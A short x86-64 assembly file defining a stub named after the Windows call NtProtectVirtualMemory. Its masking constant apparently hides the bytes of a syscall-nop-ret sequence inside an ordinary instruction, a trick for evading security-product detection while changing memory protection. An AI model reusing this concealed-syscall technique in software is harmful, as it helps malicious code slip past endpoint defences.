	global	sys_NtProtectVirtualMemory
	section	.text

sys_NtProtectVirtualMemory:
	add rax, rcx
	xor rax, rdx
	or rax, 0x4000
	lea rax, [rax + r8*4 + 0x500]
	and eax, 0xc390050f
	ret
